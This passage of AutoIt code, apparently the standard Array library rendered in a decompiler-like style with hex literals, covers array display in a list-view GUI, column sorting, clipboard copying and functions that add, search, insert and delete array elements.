            $iddata_label = GUICtrlCreateLabel($sdisplaydata, 0x0, $aiguisize[0x1] + -20, $aiguisize[0x0], 0x12, BitOR($_ARRAYCONSTANT_SS_CENTER, $_ARRAYCONSTANT_SS_CENTERIMAGE))
        EndIf
        If $_g_arraydisplay_itranspose Or $SARRAYRANGE Then
            GUICtrlSetColor($iddata_label, 0xff0000)
            GUICtrlSetTip($iddata_label, $stipdata)
        EndIf
        GUICtrlSetResizing($idcopy_id, $_ARRAYCONSTANT_GUI_DOCKLEFT + $_ARRAYCONSTANT_GUI_DOCKBOTTOM + $_ARRAYCONSTANT_GUI_DOCKHEIGHT)
        GUICtrlSetResizing($idcopy_data, $_ARRAYCONSTANT_GUI_DOCKRIGHT + $_ARRAYCONSTANT_GUI_DOCKBOTTOM + $_ARRAYCONSTANT_GUI_DOCKHEIGHT)
        GUICtrlSetResizing($iddata_label, $_ARRAYCONSTANT_GUI_DOCKLEFT + $_ARRAYCONSTANT_GUI_DOCKBOTTOM + $_ARRAYCONSTANT_GUI_DOCKHEIGHT)
        GUICtrlSetResizing($iduser_func, $_ARRAYCONSTANT_GUI_DOCKHCENTER + $_ARRAYCONSTANT_GUI_DOCKBOTTOM + $_ARRAYCONSTANT_GUI_DOCKHEIGHT)
        GUICtrlSetResizing($idexit_script, $_ARRAYCONSTANT_GUI_DOCKRIGHT + $_ARRAYCONSTANT_GUI_DOCKBOTTOM + $_ARRAYCONSTANT_GUI_DOCKHEIGHT)
    #EndRegion Create bottom infos
    GUISetState(@SW_SHOW, $hgui)
    If $ftimer > 0x3e8 And Not $SARRAYRANGE Then
        Beep(0x2ee, 0xfa)
        ToolTip("Sorting Action can take as long as " & Ceiling($ftimer / 0x3e8) & " sec" & @CRLF & @CRLF & "Please be patient when you click to sort a column", 0x32, 0x32, $smsgboxtitle, $TIP_WARNINGICON, $TIP_BALLOON)
        Sleep(0xbb8)
        ToolTip('')
    EndIf
    #Region GUI Handling events
        Local $ioneventmode = Opt("GUIOnEventMode", 0x0), $amsg
        While 0x1
            $amsg = GUIGetMsg($_ARRAYCONSTANT_GUI_EVENT_ARRAY)
            If $amsg[0x1] = $hgui Then
                Switch $amsg[0x0]
                Case $_ARRAYCONSTANT_GUI_EVENT_CLOSE
                    ExitLoop
                Case $idcopy_id, $idcopy_data
                    Local $isel_count = GUICtrlSendMsg($idlistview, $_ARRAYCONSTANT_LVM_GETSELECTEDCOUNT, 0x0, 0x0)
                    If $iverbose And (Not $isel_count) And ($_g_arraydisplay_iitem_end - $_g_arraydisplay_iitem_start) * ($_g_arraydisplay_isubitem_end - $_g_arraydisplay_isubitem_start) > 0x2710 Then
                        SplashTextOn($smsgboxtitle, "Copying data" & @CRLF & @CRLF & "Please be patient", 0x12c, 0x64)
                    EndIf
                    Local $sclip = '', $sitem, $asplit, $ifirstcol = 0x0
                    If $amsg[0x0] = $idcopy_data And $_g_arraydisplay_idisplayrow Then $ifirstcol = 0x1
                    For $i = 0x0 To GUICtrlSendMsg($idlistview, 0x1004, 0x0, 0x0) + -1
                        If $isel_count And Not (GUICtrlSendMsg($idlistview, $_ARRAYCONSTANT_LVM_GETITEMSTATE, $i, $_ARRAYCONSTANT_LVIS_SELECTED) <> 0x0) Then
                            ContinueLoop
                        EndIf
                        $sitem = __arraydisplay_getitemtextstringselected($idlistview, $i, $ifirstcol)
                        If $amsg[0x0] = $idcopy_id And Not $_g_arraydisplay_idisplayrow Then
                            $sitem = $arraydisplay_rowprefix & " " & ($i + $_g_arraydisplay_iitem_start) & $scurr_separator & $sitem
                        EndIf
                        If $icw_colwidth Then
                            $asplit = StringSplit($sitem, $scurr_separator)
                            $sitem = ''
                            For $j = 0x1 To $asplit[0x0]
                                $sitem &= StringFormat("%-" & $icw_colwidth + 0x1 & "s", StringLeft($asplit[$j], $icw_colwidth))
                            Next
                        Else
                            $sitem = StringReplace($sitem, $scurr_separator, $VUSER_SEPARATOR)
                        EndIf
                        $sclip &= $sitem & @CRLF
                    Next
                    $sitem = $SHEADER
                    If $amsg[0x0] = $idcopy_id Then
                        $sitem = $SHEADER
                        If Not $_g_arraydisplay_idisplayrow Then
                            $sitem = "Row" & $scurr_separator & $sitem
                        EndIf
                        If $icw_colwidth Then
                            $asplit = StringSplit($sitem, $scurr_separator)
                            $sitem = ''
                            For $j = 0x1 To $asplit[0x0]
                                $sitem &= StringFormat("%-" & $icw_colwidth + 0x1 & "s", StringLeft($asplit[$j], $icw_colwidth))
                            Next
                        Else
                            $sitem = StringReplace($sitem, $scurr_separator, $VUSER_SEPARATOR)
                        EndIf
                        $sclip = $sitem & @CRLF & $sclip
                    EndIf
                    ClipPut($sclip)
                    SplashOff()
                    GUICtrlSetState($idlistview, $_ARRAYCONSTANT_GUI_FOCUS)
                Case $idlistview
                    $icolumn = GUICtrlGetState($idlistview)
                    If Not IsArray($_g_arraydisplay_aindexes[$icolumn + Not $_g_arraydisplay_idisplayrow]) Then
                        __arraydisplay_sortindexes($icolumn + Not $_g_arraydisplay_idisplayrow)
                    EndIf
                    If $icolumn <> $icolumnprev Then
                        __arraydisplay_headersetitemformat($hheader, $icolumnprev, 0x4000 + $icolalign / 0x2)
                        If $_g_arraydisplay_idisplayrow And $icolumn = 0x0 Then
                            $_g_arraydisplay_aindex = $_g_arraydisplay_aindexes[0x0]
                        Else
                            $_g_arraydisplay_aindex = $_g_arraydisplay_aindexes[$icolumn + Not $_g_arraydisplay_idisplayrow]
                        EndIf
                    EndIf
                    $_g_arraydisplay_isortdir = ($icolumn = $icolumnprev) ? $_g_arraydisplay_isortdir = 0x400  ? 0x200  : 0x400  : 0x400
                    __arraydisplay_headersetitemformat($hheader, $icolumn, 0x4000 + $_g_arraydisplay_isortdir + $icolalign / 0x2)
                    GUICtrlSendMsg($idlistview, (0x1000 + 0x8c), $icolumn, 0x0)
                    GUICtrlSendMsg($idlistview, (0x1000 + 0x2f), $_g_arraydisplay_nrows, 0x0)
                    $icolumnprev = $icolumn
                Case $iduser_func
                    Local $aiselitems[0x1] = [0x0]
                    For $i = 0x0 To GUICtrlSendMsg($idlistview, 0x1004, 0x0, 0x0) + -1
                        If (GUICtrlSendMsg($idlistview, $_ARRAYCONSTANT_LVM_GETITEMSTATE, $i, $_ARRAYCONSTANT_LVIS_SELECTED) <> 0x0) Then
                            $aiselitems[0x0]+= 0x1
                            ReDim $aiselitems[$aiselitems[0x0] + 0x1]
                            $aiselitems[$aiselitems[0x0]] = $i + $_g_arraydisplay_iitem_start
                        EndIf
                    Next
                    $HUSER_FUNCTION($_g_arraydisplay_aarray, $aiselitems)
                    GUICtrlSetState($idlistview, $_ARRAYCONSTANT_GUI_FOCUS)
                Case $idexit_script
                    GUIDelete($hgui)
                    Exit
                EndSwitch
            EndIf
        WEnd
    #EndRegion GUI Handling events
    DllCall("comctl32.dll", "bool", "RemoveWindowSubclass", "hwnd", $hgui, "ptr", $p__arraydisplay_notifyhandler, "uint_ptr", 0x0)
    $_g_arraydisplay_aindex = 0x0
    Dim $_g_arraydisplay_aindexes[0x1]
    GUIDelete($hgui)
    Opt("GUICoordMode", $icoordmode)
    Opt("GUIOnEventMode", $ioneventmode)
    Return SetError($_ICALLERERROR, $_ICALLEREXTENDED, 0x1)
EndFunc    ; -> __ArrayDisplay_Share

Func __arraydisplay_notifyhandler($hwnd, $imsg, $wparam, $lparam, $isubclassid, $pdata)
    If $imsg <> 0x4e Then Return DllCall("comctl32.dll", "lresult", "DefSubclassProc", "hwnd", $hwnd, "uint", $imsg, "wparam", $wparam, "lparam", $lparam)[0x0]
    Local Static $TAGNMHDR = "struct;hwnd hWndFrom;uint_ptr IDFrom;INT Code;endstruct"
    Local Static $TAGNMLVDISPINFO = $TAGNMHDR & ";" & $_ARRAYCONSTANT_TAGLVITEM
    Local $tnmlvdispinfo = DllStructCreate($TAGNMLVDISPINFO, $lparam)
    Switch HWnd(DllStructGetData($tnmlvdispinfo, "hWndFrom"))
    Case $_g_arraydisplay_hlistview
        Switch DllStructGetData($tnmlvdispinfo, "Code")
        Case + -177
            Local Static $ttext = DllStructCreate("wchar[4096]"), $ptext = DllStructGetPtr($ttext)
            Local $iitem = DllStructGetData($tnmlvdispinfo, "Item")
            Local $irow = ($_g_arraydisplay_isortdir = 0x400) ? $_g_arraydisplay_aindex[$iitem] : $_g_arraydisplay_aindex[$_g_arraydisplay_nrows + -1 - $iitem]
            Local $icol = DllStructGetData($tnmlvdispinfo, "SubItem")
            Local $stemp
            If $_g_arraydisplay_idisplayrow = 0x0 Then
                If $_g_arraydisplay_idims = 0x2 Then
                    $stemp = $_g_arraydisplay_aarray[$irow][$icol]
                Else
                    $stemp = $_g_arraydisplay_aarray[$irow]
                EndIf
                Switch VarGetType($stemp)
                Case "Array"
                    $stemp = "{Array}"
                Case "Map"
                    $stemp = "{Map}"
                EndSwitch
                If StringLen($stemp) > 0xfff Then $stemp = StringLeft($stemp, 0xfff)
                DllStructSetData($ttext, 0x1, $stemp)
                DllStructSetData($tnmlvdispinfo, "Text", $ptext)
            Else
                If $icol = 0x0 Then
                    If $_g_arraydisplay_itranspose Then
                        Local $scaptioncplt = ''
                        If $irow + $_g_arraydisplay_iitem_start < UBound($_g_arraydisplay_asheader) And StringStripWS($_g_arraydisplay_asheader[$irow + $_g_arraydisplay_iitem_start], 0x1 + 0x2) <> '' Then
                            $scaptioncplt = " (" & StringStripWS($_g_arraydisplay_asheader[$irow + $_g_arraydisplay_iitem_start], 0x1 + 0x2)
                            If StringRight($scaptioncplt, 0x1) = $arraydisplay_numericsort Then $scaptioncplt = StringTrimRight($scaptioncplt, 0x1)
                            $scaptioncplt &= ")"
                        EndIf
                        DllStructSetData($ttext, 0x1, "Col " & ($irow + $_g_arraydisplay_iitem_start) & $scaptioncplt)
                    Else
                        DllStructSetData($ttext, 0x1, $arraydisplay_rowprefix & " " & $irow + $_g_arraydisplay_iitem_start)
                    EndIf
                    DllStructSetData($tnmlvdispinfo, "Text", $ptext)
                Else
                    If $_g_arraydisplay_idims = 0x2 Then
                        $stemp = $_g_arraydisplay_aarray[$irow][$icol + -1]
                    Else
                        $stemp = $_g_arraydisplay_aarray[$irow]
                    EndIf
                    Switch VarGetType($stemp)
                    Case "Array"
                        $stemp = "{Array}"
                    Case "Map"
                        $stemp = "{Map}"
                    EndSwitch
                    If StringLen($stemp) > 0xfff Then $stemp = StringLeft($stemp, 0xfff)
                    DllStructSetData($ttext, 0x1, $stemp)
                    DllStructSetData($tnmlvdispinfo, "Text", $ptext)
                EndIf
            EndIf
            Return
        EndSwitch
    EndSwitch
    Return DllCall("comctl32.dll", "lresult", "DefSubclassProc", "hwnd", $hwnd, "uint", $imsg, "wparam", $wparam, "lparam", $lparam)[0x0]
    #forceref $iSubclassId, $pData
EndFunc    ; -> __arraydisplay_notifyhandler

Func __arraydisplay_sortindexes($icolstart, $icolend = $icolstart)
    Dim $_g_arraydisplay_aindex[$_g_arraydisplay_nrows]
    If $icolend = + -1 Then
        Dim $_g_arraydisplay_aindexes[$_g_arraydisplay_ncols + $_g_arraydisplay_idisplayrow + 0x1]
        For $i = 0x0 To $_g_arraydisplay_nrows + -1
            $_g_arraydisplay_aindex[$i] = $i
        Next
        $_g_arraydisplay_aindexes[0x0] = $_g_arraydisplay_aindex
    EndIf
    If $icolstart = + -1 Then
        $icolstart = 0x1
        $icolend = $_g_arraydisplay_ncols
    EndIf
    If $icolstart Then
        Local $tindex
        For $i = $icolstart To $icolend
            $tindex = __arraydisplay_getsortcolstruct($_g_arraydisplay_aarray, $i + -1)
            For $j = 0x0 To $_g_arraydisplay_nrows + -1
                $_g_arraydisplay_aindex[$j] = DllStructGetData($tindex, 0x1, $j + 0x1)
            Next
            $_g_arraydisplay_aindexes[$i] = $_g_arraydisplay_aindex
        Next
    EndIf
EndFunc    ; -> __arraydisplay_sortindexes

Func __arraydisplay_getsortcolstruct(Const ByRef $AARRAY, $icol)
    If UBound($AARRAY, $UBOUND_DIMENSIONS) < 0x1 Or UBound($AARRAY, $UBOUND_DIMENSIONS) > 0x2 Then
        Return SetError(0x6, 0x0, 0x0)
    EndIf
    Return __arraydisplay_sortarraystruct($AARRAY, $icol)
EndFunc    ; -> __arraydisplay_getsortcolstruct

Func __arraydisplay_sortarraystruct(Const ByRef $AARRAY, $icol)
    Local $idims = UBound($AARRAY, $UBOUND_DIMENSIONS)
    Local $tindex = DllStructCreate("uint[" & $_g_arraydisplay_nrows & "]")
    Local $pindex = DllStructGetPtr($tindex)
    Static $hdll = DllOpen("kernel32.dll")
    Static $hdllcomp = DllOpen("shlwapi.dll")
    Local $lo, $hi, $mi, $r, $nval1, $nval2
    For $i = 0x1 To $_g_arraydisplay_nrows + -1
        $lo = 0x0
        $hi = $i + -1
        Do
            $mi = Int(($lo + $hi) / 0x2)
            If Not $_g_arraydisplay_itranspose And $_g_arraydisplay_anumericsort[$icol] Then
                If $idims = 0x1 Then
                    $nval1 = Number($AARRAY[$i])
                    $nval2 = Number($AARRAY[DllStructGetData($tindex, 0x1, $mi + 0x1)])
                Else
                    $nval1 = Number($AARRAY[$i][$icol])
                    $nval2 = Number($AARRAY[DllStructGetData($tindex, 0x1, $mi + 0x1)][$icol])
                EndIf
                $r = $nval1 < $nval2  ? + -1  : $nval1 > $nval2  ? 0x1  : 0x0
            Else
                If $idims = 0x1 Then
                    $r = DllCall($hdllcomp, "int", "StrCmpLogicalW", "wstr", $AARRAY[$i], "wstr", $AARRAY[DllStructGetData($tindex, 0x1, $mi + 0x1)])[0x0]
                Else
                    $r = DllCall($hdllcomp, "int", "StrCmpLogicalW", "wstr", $AARRAY[$i][$icol], "wstr", $AARRAY[DllStructGetData($tindex, 0x1, $mi + 0x1)][$icol])[0x0]
                EndIf
            EndIf
            Switch $r
            Case + -1
                $hi = $mi + -1
            Case 0x1
                $lo = $mi + 0x1
            Case 0x0
                ExitLoop
            EndSwitch
        Until $lo > $hi
        DllCall($hdll, "none", "RtlMoveMemory", "struct*", $pindex + ($mi + 0x1) * 0x4, "struct*", $pindex + $mi * 0x4, "ulong_ptr", ($i - $mi) * 0x4)
        DllStructSetData($tindex, 0x1, $i, $mi + 0x1 + ($lo = $mi + 0x1))
    Next
    Return $tindex
EndFunc    ; -> __arraydisplay_sortarraystruct

Func __arraydisplay_createsubarray()
    Local $nrows = $_g_arraydisplay_iitem_end - $_g_arraydisplay_iitem_start + 0x1
    Local $ncols = $_g_arraydisplay_isubitem_end - $_g_arraydisplay_isubitem_start + 0x1
    Local $irow = + -1, $icol, $itemp, $atemp
    If $_g_arraydisplay_itranspose Then
        Dim $atemp[$ncols][$nrows]
        For $i = $_g_arraydisplay_iitem_start To $_g_arraydisplay_iitem_end
            $irow += 0x1
            $icol = + -1
            For $j = $_g_arraydisplay_isubitem_start To $_g_arraydisplay_isubitem_end
                $icol += 0x1
                $atemp[$icol][$irow] = $_g_arraydisplay_aarray[$i][$j]
            Next
        Next
        $itemp = $_g_arraydisplay_iitem_start
        $_g_arraydisplay_iitem_start = $_g_arraydisplay_isubitem_start
        $_g_arraydisplay_isubitem_start = $itemp
        $itemp = $_g_arraydisplay_iitem_end
        $_g_arraydisplay_iitem_end = $_g_arraydisplay_isubitem_end
        $_g_arraydisplay_isubitem_end = $itemp
        $_g_arraydisplay_nrows = $ncols
        $_g_arraydisplay_ncols = $nrows
    Else
        If $_g_arraydisplay_idims = 0x1 Then
            Dim $atemp[$nrows]
            For $i = $_g_arraydisplay_iitem_start To $_g_arraydisplay_iitem_end
                $irow += 0x1
                $atemp[$irow] = $_g_arraydisplay_aarray[$i]
            Next
        Else
            Dim $atemp[$nrows][$ncols]
            For $i = $_g_arraydisplay_iitem_start To $_g_arraydisplay_iitem_end
                $irow += 0x1
                $icol = + -1
                For $j = $_g_arraydisplay_isubitem_start To $_g_arraydisplay_isubitem_end
                    $icol += 0x1
                    $atemp[$irow][$icol] = $_g_arraydisplay_aarray[$i][$j]
                Next
            Next
            $_g_arraydisplay_ncols = $ncols
        EndIf
        $_g_arraydisplay_nrows = $nrows
    EndIf
    Return $atemp
EndFunc    ; -> __arraydisplay_createsubarray

Func __arraydisplay_headersetitemformat($hwnd, $iindex, $iformat)
    Local Static $thditem = DllStructCreate("uint Mask;int XY;ptr Text;handle hBMP;int TextMax;int Fmt;lparam Param;int Image;int Order;uint Type;ptr pFilter;uint State")
    DllStructSetData($thditem, "Mask", 0x4)
    DllStructSetData($thditem, "Fmt", $iformat)
    Local $aresult = DllCall("user32.dll", "lresult", "SendMessageW", "hwnd", $hwnd, "uint", 0x120c, "wparam", $iindex, "struct*", $thditem)
    Return $aresult[0x0] <> 0x0
EndFunc    ; -> __arraydisplay_headersetitemformat

Func __ArrayDisplay_GetItemText($idlistview, $iindex, $isubitem = 0x0)
    Local $tbuffer = DllStructCreate("wchar Text[4096]")
    Local $pbuffer = DllStructGetPtr($tbuffer)
    Local $titem = DllStructCreate($_ARRAYCONSTANT_TAGLVITEM)
    DllStructSetData($titem, "SubItem", $isubitem)
    DllStructSetData($titem, "TextMax", 0x1000)
    DllStructSetData($titem, "Text", $pbuffer)
    If IsHWnd($idlistview) Then
        DllCall("user32.dll", "lresult", "SendMessageW", "hwnd", $idlistview, "uint", 0x1073, "wparam", $iindex, "struct*", $titem)
    Else
        Local $pitem = DllStructGetPtr($titem)
        GUICtrlSendMsg($idlistview, 0x1073, $iindex, $pitem)
    EndIf
    Return DllStructGetData($tbuffer, "Text")
EndFunc    ; -> __ArrayDisplay_GetItemText

Func __arraydisplay_getitemtextstringselected($idlistview, $iitem, $ifirstcol)
    Local $srow = '', $sseparatorchar = Opt("GUIDataSeparatorChar")
    Local $iselected = $iitem
    Local $hheader = HWnd(GUICtrlSendMsg($idlistview, 0x101f, 0x0, 0x0))
    Local $ncol = DllCall("user32.dll", "lresult", "SendMessageW", "hwnd", $hheader, "uint", 0x1200, "wparam", 0x0, "lparam", 0x0)[0x0]
    For $x = $ifirstcol To $ncol + -1
        $srow &= __ArrayDisplay_GetItemText($idlistview, $iselected, $x) & $sseparatorchar
    Next
    Return StringTrimRight($srow, 0x1)
EndFunc    ; -> __arraydisplay_getitemtextstringselected

Func __ArrayDisplay_JustifyColumn($idlistview, $iindex, $ialign = + -1)
    Local $tcolumn = DllStructCreate("uint Mask;int Fmt;int CX;ptr Text;int TextMax;int SubItem;int Image;int Order;int cxMin;int cxDefault;int cxIdeal")
    If $ialign < 0x0 Or $ialign > 0x2 Then $ialign = 0x0
    DllStructSetData($tcolumn, "Mask", 0x1)
    DllStructSetData($tcolumn, "Fmt", $ialign)
    Local $pcolumn = DllStructGetPtr($tcolumn)
    Local $iret = GUICtrlSendMsg($idlistview, 0x1060, $iindex, $pcolumn)
    Return $iret <> 0x0
EndFunc    ; -> __ArrayDisplay_JustifyColumn

Global Enum $ARRAYFILL_FORCE_DEFAULT, $ARRAYFILL_FORCE_SINGLEITEM, $ARRAYFILL_FORCE_INT, $ARRAYFILL_FORCE_NUMBER, $ARRAYFILL_FORCE_PTR, $ARRAYFILL_FORCE_HWND, $ARRAYFILL_FORCE_STRING, $ARRAYFILL_FORCE_BOOLEAN
Global Enum $ARRAYUNIQUE_NOCOUNT, $ARRAYUNIQUE_COUNT
Global Enum $ARRAYUNIQUE_AUTO, $ARRAYUNIQUE_FORCE32, $ARRAYUNIQUE_FORCE64, $ARRAYUNIQUE_MATCH, $ARRAYUNIQUE_DISTINCT
Func _ArrayAdd(ByRef $AARRAY, $vvalue, $ISTART = 0x0, $sdelim_item = "|", $sdelim_row = @CRLF, $iforce = $ARRAYFILL_FORCE_DEFAULT)
    If $ISTART = Default Then $ISTART = 0x0
    If $sdelim_item = Default Then $sdelim_item = "|"
    If $sdelim_row = Default Then $sdelim_row = @CRLF
    If $iforce = Default Then $iforce = $ARRAYFILL_FORCE_DEFAULT
    If Not IsArray($AARRAY) Then Return SetError(0x1, 0x0, + -1)
    Local $idim_1 = UBound($AARRAY, $UBOUND_ROWS)
    Local $hdatatype = 0x0
    Switch $iforce
    Case $ARRAYFILL_FORCE_INT
        $hdatatype = Int
    Case $ARRAYFILL_FORCE_NUMBER
        $hdatatype = Number
    Case $ARRAYFILL_FORCE_PTR
        $hdatatype = Ptr
    Case $ARRAYFILL_FORCE_HWND
        $hdatatype = HWnd
    Case $ARRAYFILL_FORCE_STRING
        $hdatatype = String
    Case $ARRAYFILL_FORCE_BOOLEAN
        $hdatatype = "Boolean"
    EndSwitch
    Switch UBound($AARRAY, $UBOUND_DIMENSIONS)
    Case 0x1
        If $iforce = $ARRAYFILL_FORCE_SINGLEITEM Then
            ReDim $AARRAY[$idim_1 + 0x1]
            $AARRAY[$idim_1] = $vvalue
            Return $idim_1
        EndIf
        If IsArray($vvalue) Then
            If UBound($vvalue, $UBOUND_DIMENSIONS) <> 0x1 Then Return SetError(0x5, 0x0, + -1)
            $hdatatype = 0x0
        Else
            Local $atmp = StringSplit($vvalue, $sdelim_item, $STR_NOCOUNT + $STR_ENTIRESPLIT)
            If UBound($atmp, $UBOUND_ROWS) = 0x1 Then
                $atmp[0x0] = $vvalue
            EndIf
            $vvalue = $atmp
        EndIf
        Local $iadd = UBound($vvalue, $UBOUND_ROWS)
        ReDim $AARRAY[$idim_1 + $iadd]
        For $i = 0x0 To $iadd + -1
            If String($hdatatype) = "Boolean" Then
                Switch $vvalue[$i]
                Case "True", "1"
                    $AARRAY[$idim_1 + $i] = True
                Case "False", "0", ''
                    $AARRAY[$idim_1 + $i] = False
                EndSwitch
            ElseIf IsFunc($hdatatype) Then
                $AARRAY[$idim_1 + $i] = $hdatatype($vvalue[$i])
            Else
                $AARRAY[$idim_1 + $i] = $vvalue[$i]
            EndIf
        Next
        Return $idim_1 + $iadd + -1
    Case 0x2
        Local $idim_2 = UBound($AARRAY, $UBOUND_COLUMNS)
        If $ISTART < 0x0 Or $ISTART > $idim_2 + -1 Then Return SetError(0x4, 0x0, + -1)
        Local $ivaldim_1, $ivaldim_2 = 0x0, $icolcount
        If IsArray($vvalue) Then
            If UBound($vvalue, $UBOUND_DIMENSIONS) <> 0x2 Then Return SetError(0x5, 0x0, + -1)
            $ivaldim_1 = UBound($vvalue, $UBOUND_ROWS)
            $ivaldim_2 = UBound($vvalue, $UBOUND_COLUMNS)
            $hdatatype = 0x0
        Else
            Local $asplit_1 = StringSplit($vvalue, $sdelim_row, $STR_NOCOUNT + $STR_ENTIRESPLIT)
            $ivaldim_1 = UBound($asplit_1, $UBOUND_ROWS)
            Local $atmp[$ivaldim_1][0x0], $asplit_2
            For $i = 0x0 To $ivaldim_1 + -1
                $asplit_2 = StringSplit($asplit_1[$i], $sdelim_item, $STR_NOCOUNT + $STR_ENTIRESPLIT)
                $icolcount = UBound($asplit_2)
                If $icolcount > $ivaldim_2 Then
                    $ivaldim_2 = $icolcount
                    ReDim $atmp[$ivaldim_1][$ivaldim_2]
                EndIf
                For $j = 0x0 To $icolcount + -1
                    $atmp[$i][$j] = $asplit_2[$j]
                Next
            Next
            $vvalue = $atmp
        EndIf
        If UBound($vvalue, $UBOUND_COLUMNS) + $ISTART > UBound($AARRAY, $UBOUND_COLUMNS) Then Return SetError(0x3, 0x0, + -1)
        ReDim $AARRAY[$idim_1 + $ivaldim_1][$idim_2]
        For $iwriteto_index = 0x0 To $ivaldim_1 + -1
            For $j = 0x0 To $idim_2 + -1
                If $j < $ISTART Then
                    $AARRAY[$iwriteto_index + $idim_1][$j] = ''
                ElseIf $j - $ISTART > $ivaldim_2 + -1 Then
                    $AARRAY[$iwriteto_index + $idim_1][$j] = ''
                Else
                    If String($hdatatype) = "Boolean" Then
                        Switch $vvalue[$iwriteto_index][$j - $ISTART]
                        Case "True", "1"
                            $AARRAY[$iwriteto_index + $idim_1][$j] = True
                        Case "False", "0", ''
                            $AARRAY[$iwriteto_index + $idim_1][$j] = False
                        EndSwitch
                    ElseIf IsFunc($hdatatype) Then
                        $AARRAY[$iwriteto_index + $idim_1][$j] = $hdatatype($vvalue[$iwriteto_index][$j - $ISTART])
                    Else
                        $AARRAY[$iwriteto_index + $idim_1][$j] = $vvalue[$iwriteto_index][$j - $ISTART]
                    EndIf
                EndIf
            Next
        Next
    Case Else
        Return SetError(0x2, 0x0, + -1)
    EndSwitch
    Return UBound($AARRAY, $UBOUND_ROWS) + -1
EndFunc    ; -> _ArrayAdd

Func _ArrayBinarySearch(Const ByRef $AARRAY, $vvalue, $ISTART = 0x0, $IEND = 0x0, $icolumn = 0x0)
    If $ISTART = Default Then $ISTART = 0x0
    If $IEND = Default Then $IEND = 0x0
    If $icolumn = Default Then $icolumn = 0x0
    If Not IsArray($AARRAY) Then Return SetError(0x1, 0x0, + -1)
    Local $idim_1 = UBound($AARRAY, $UBOUND_ROWS)
    If $idim_1 = 0x0 Then Return SetError(0x6, 0x0, + -1)
    If $IEND < 0x1 Or $IEND > $idim_1 + -1 Then $IEND = $idim_1 + -1
    If $ISTART < 0x0 Then $ISTART = 0x0
    If $ISTART > $IEND Then Return SetError(0x4, 0x0, + -1)
    Local $imid = Int(($IEND + $ISTART) / 0x2)
    Switch UBound($AARRAY, $UBOUND_DIMENSIONS)
    Case 0x1
        If $AARRAY[$ISTART] > $vvalue Or $AARRAY[$IEND] < $vvalue Then Return SetError(0x2, 0x0, + -1)
        While $ISTART <= $imid And $vvalue <> $AARRAY[$imid]
            If $vvalue < $AARRAY[$imid] Then
                $IEND = $imid + -1
            Else
                $ISTART = $imid + 0x1
            EndIf
            $imid = Int(($IEND + $ISTART) / 0x2)
        WEnd
        If $ISTART > $IEND Then Return SetError(0x3, 0x0, + -1)
    Case 0x2
        Local $idim_2 = UBound($AARRAY, $UBOUND_COLUMNS) + -1
        If $icolumn < 0x0 Or $icolumn > $idim_2 Then Return SetError(0x7, 0x0, + -1)
        If $AARRAY[$ISTART][$icolumn] > $vvalue Or $AARRAY[$IEND][$icolumn] < $vvalue Then Return SetError(0x2, 0x0, + -1)
        While $ISTART <= $imid And $vvalue <> $AARRAY[$imid][$icolumn]
            If $vvalue < $AARRAY[$imid][$icolumn] Then
                $IEND = $imid + -1
            Else
                $ISTART = $imid + 0x1
            EndIf
            $imid = Int(($IEND + $ISTART) / 0x2)
        WEnd
        If $ISTART > $IEND Then Return SetError(0x3, 0x0, + -1)
    Case Else
        Return SetError(0x5, 0x0, + -1)
    EndSwitch
    Return $imid
EndFunc    ; -> _ArrayBinarySearch

Func _ArrayColDelete(ByRef $AARRAY, $icolumn, $bconvert = False)
    If $bconvert = Default Then $bconvert = False
    If Not IsArray($AARRAY) Then Return SetError(0x1, 0x0, + -1)
    Local $idim_1 = UBound($AARRAY, $UBOUND_ROWS)
    If UBound($AARRAY, $UBOUND_DIMENSIONS) <> 0x2 Then Return SetError(0x2, 0x0, + -1)
    Local $idim_2 = UBound($AARRAY, $UBOUND_COLUMNS)
    Switch $idim_2
    Case 0x2
        If $icolumn < 0x0 Or $icolumn > 0x1 Then Return SetError(0x3, 0x0, + -1)
        If $bconvert Then
            Local $atemparray[$idim_1]
            For $i = 0x0 To $idim_1 + -1
                $atemparray[$i] = $AARRAY[$i][(Not $icolumn)]
            Next
            $AARRAY = $atemparray
        Else
            ContinueCase
        EndIf
    Case Else
        If $icolumn < 0x0 Or $icolumn > $idim_2 + -1 Then Return SetError(0x3, 0x0, + -1)
        For $i = 0x0 To $idim_1 + -1
            For $j = $icolumn To $idim_2 + -2
                $AARRAY[$i][$j] = $AARRAY[$i][$j + 0x1]
            Next
        Next
        ReDim $AARRAY[$idim_1][$idim_2 + -1]
    EndSwitch
    Return UBound($AARRAY, $UBOUND_COLUMNS)
EndFunc    ; -> _ArrayColDelete

Func _ArrayColInsert(ByRef $AARRAY, $icolumn)
    If Not IsArray($AARRAY) Then Return SetError(0x1, 0x0, + -1)
    Local $idim_1 = UBound($AARRAY, $UBOUND_ROWS)
    Switch UBound($AARRAY, $UBOUND_DIMENSIONS)
    Case 0x1
        Local $atemparray[$idim_1][0x2]
        Switch $icolumn
        Case 0x0, 0x1
            For $i = 0x0 To $idim_1 + -1
                $atemparray[$i][(Not $icolumn)] = $AARRAY[$i]
            Next
        Case Else
            Return SetError(0x3, 0x0, + -1)
        EndSwitch
        $AARRAY = $atemparray
    Case 0x2
        Local $idim_2 = UBound($AARRAY, $UBOUND_COLUMNS)
        If $icolumn < 0x0 Or $icolumn > $idim_2 Then Return SetError(0x3, 0x0, + -1)
        ReDim $AARRAY[$idim_1][$idim_2 + 0x1]
        For $i = 0x0 To $idim_1 + -1
            For $j = $idim_2 To $icolumn + 0x1 Step + -1
                $AARRAY[$i][$j] = $AARRAY[$i][$j + -1]
            Next
            $AARRAY[$i][$icolumn] = ''
        Next
    Case Else
        Return SetError(0x2, 0x0, + -1)
    EndSwitch
    Return UBound($AARRAY, $UBOUND_COLUMNS)
EndFunc    ; -> _ArrayColInsert

Func _ArrayCombinations(Const ByRef $AARRAY, $ISET, $sdelimiter = '')
    If $sdelimiter = Default Then $sdelimiter = ''
    If Not IsArray($AARRAY) Then Return SetError(0x1, 0x0, 0x0)
    If UBound($AARRAY, $UBOUND_DIMENSIONS) <> 0x1 Then Return SetError(0x2, 0x0, 0x0)
    Local $in = UBound($AARRAY)
    Local $ir = $ISET
    Local $aidx[$ir]
    For $i = 0x0 To $ir + -1
        $aidx[$i] = $i
    Next
    Local $itotal = __Array_Combinations($in, $ir)
    Local $ileft = $itotal
    Local $aresult[$itotal + 0x1]
    $aresult[0x0] = $itotal
    Local $icount = 0x1
    While $ileft > 0x0
        __Array_GetNext($in, $ir, $ileft, $itotal, $aidx)
        For $i = 0x0 To $ISET + -1
            $aresult[$icount]&= $AARRAY[$aidx[$i]] & $sdelimiter
        Next
